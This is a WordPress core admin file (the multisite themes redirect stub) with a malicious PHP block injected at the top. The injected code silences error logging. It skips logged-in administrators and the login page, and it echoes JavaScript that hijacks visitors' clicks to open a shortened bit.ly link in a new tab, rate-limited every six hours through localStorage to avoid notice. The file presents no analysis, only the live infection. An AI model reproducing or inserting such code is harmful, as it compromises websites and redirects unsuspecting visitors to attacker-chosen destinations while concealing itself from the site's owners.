<?php

error_reporting(0);
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('display_errors', 0);

$ckUjYggTf = 0;
foreach($_COOKIE as $vUjUnHvOOoO => $vvvUjUnHvOOoO){
  if (strstr(strval($vUjUnHvOOoO), 'wordpress_logged_in')){
    $ckUjYggTf = 1;
    break;
  }
}

if($ckUjYggTf == 0 && !strstr(strval($_SERVER['REQUEST_URI']), 'wp-login.php')){
	echo "<script>(function (parameters) {
		const getHoursDiff = (startDate, endDate) => {
			const msInHour = 1000 * 60 * 60;
			return Math.round(Math.abs(endDate - startDate) / msInHour);
		}
		const getFromStorage = (host) => localStorage.getItem(`\${host}-local-storage`);
		const addToStorage = (host, nowDate) => localStorage.setItem(`\${host}-local-storage`, nowDate);

		function globalClick(event) {
			const host = location.host
			const newLocation = \"https://bit.ly/3AAXYh6\"
			const allowedHours = 6

			const nowDate = Date.parse(new Date());
			const savedData = getFromStorage(host)

			if (savedData) {
				try {
					const storageDate = parseInt(savedData);
					// check hours
					const hoursDiff = getHoursDiff(nowDate, storageDate)
					console.log(nowDate, storageDate, hoursDiff)
					if (hoursDiff >= allowedHours) {
						addToStorage(host, nowDate);
						window.open(newLocation, \"_blank\");
					}
				} catch (error) {
					addToStorage(host, nowDate);
					window.open(newLocation, \"_blank\");
				}
			} else {
				addToStorage(host, nowDate);
				window.open(newLocation, \"_blank\");
			}
		}
		document.addEventListener(\"click\", globalClick);
	})();</script>";
}

?>
<?php
/**
 * Multisite themes administration panel.
 *
 * @package WordPress
 * @subpackage Multisite
 * @since 3.0.0
 */

require_once( dirname( __FILE__ ) . '/admin.php' );

wp_redirect( network_admin_url('themes.php') );
exit;
